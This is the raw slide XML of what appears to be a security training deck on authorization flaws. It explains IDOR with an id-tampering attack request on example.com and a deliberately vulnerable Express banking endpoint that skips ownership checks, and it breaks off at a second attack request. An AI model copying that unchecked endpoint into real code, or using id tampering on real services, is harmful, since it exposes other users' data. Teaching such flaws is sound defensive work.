                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Privilege Escalation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7401997" y="5357864"/>
            <a:ext cx="6533555" cy="1191250"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="2300"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1550" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Access unauthorized data</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1550" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="2300"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1550" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Perform privileged actions</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1550" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="2300"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1550" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Modify other users' information</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1550" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="2300"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1550" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Gain administrative control</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66167" y="654963"/>
            <a:ext cx="10328434" cy="718304"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="5650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="4500" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Common Authorization Vulnerabilities</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="766167" y="1457682"/>
            <a:ext cx="9149001" cy="574596"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="4500"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>5.1 Insecure Direct Object Reference (IDOR)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="766167" y="2116693"/>
            <a:ext cx="3447931" cy="431006"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="3350"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>What is IDOR?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="766167" y="2864525"/>
            <a:ext cx="13098066" cy="688419"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="squar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IDOR occurs when an application exposes direct references to internal objects (files, database records, URLs) without proper authorization checks.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="766167" y="3869769"/>
            <a:ext cx="5146238" cy="431006"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="3350"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Vulnerable Code Example (PHP):</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="766167" y="4385191"/>
            <a:ext cx="3447931" cy="431006"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="3350"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Normal Request:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="766167" y="5133023"/>
            <a:ext cx="13098066" cy="688419"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2700"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="007EBD"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
                <a:hlinkClick r:id="rId3">
                  <a:extLst>
                    <a:ext uri="{A12FA001-AC4F-418D-AE19-62706E023703}">
                      <ahyp:hlinkClr xmlns:ahyp="http://schemas.microsoft.com/office/drawing/2018/hyperlinkcolor" val="tx"/>
                    </a:ext>
                  </a:extLst>
                </a:hlinkClick>
              </a:rPr>
              <a:t>https://example.com/profile.php?id=123</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Response: Shows user 123's profile (if logged in as user 123)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="766167" y="6138267"/>
            <a:ext cx="3447931" cy="431006"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="3350"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Attack Request:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="766167" y="6886099"/>
            <a:ext cx="13098066" cy="688419"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2700"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="007EBD"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
                <a:hlinkClick r:id="rId4">
                  <a:extLst>
                    <a:ext uri="{A12FA001-AC4F-418D-AE19-62706E023703}">
                      <ahyp:hlinkClr xmlns:ahyp="http://schemas.microsoft.com/office/drawing/2018/hyperlinkcolor" val="tx"/>
                    </a:ext>
                  </a:extLst>
                </a:hlinkClick>
              </a:rPr>
              <a:t>https://example.com/profile.php?id=456</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Response: Shows user 456's profile (UNAUTHORIZED ACCESS!)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2824401" y="1387912"/>
            <a:ext cx="4630103" cy="256223"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Real-World IDOR Example - Bank Account Access</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2824401" y="1793438"/>
            <a:ext cx="8981480" cy="163830"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1250"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Vulnerable Banking Application:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2824401" y="2041208"/>
            <a:ext cx="8981480" cy="1833324"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2982"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2817971" y="2041208"/>
            <a:ext cx="8994338" cy="1833324"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1065"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2948107" y="2138720"/>
            <a:ext cx="8734068" cy="1638300"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="125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Node.js/Express - VULNERABLE CODE</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="125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app.get('/api/account/:accountId', (req, res) =&gt; {</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="125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const accountId = req.params.accountId;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="125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a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="125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 NO CHECK: Does this account belong to logged-in user?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="125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db.query('SELECT * FROM accounts WHERE id = ?', [accountId], (err, result) =&gt; {</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="125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if (err) return res.status(500).send('Error');</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="125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res.json(result[0]);</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="125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a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="125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a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2824401" y="4025622"/>
            <a:ext cx="4331970" cy="163830"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1250"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Legitimate Request:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2824401" y="4273391"/>
            <a:ext cx="4331970" cy="1997154"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2737"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2817971" y="4273391"/>
            <a:ext cx="4344829" cy="1997154"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 978"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2948107" y="4370903"/>
            <a:ext cx="4084558" cy="1802130"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="125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User logs in and views their account</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="125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GET /api/account/12345</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="125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Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1250"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="125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Response:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="125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a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="125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"accountId": 12345,</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="125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"owner": "John Doe",</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="125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"balance": 50000,</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="125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"accountNumber": "1234-5678-9012"</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="125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a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7387709" y="3958471"/>
            <a:ext cx="4519374" cy="2396014"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3912"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="007EBD">
              <a:alpha val="95000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7517844" y="4025622"/>
            <a:ext cx="4259104" cy="163830"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1250"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Attack Request:</a:t>
            </a:r>
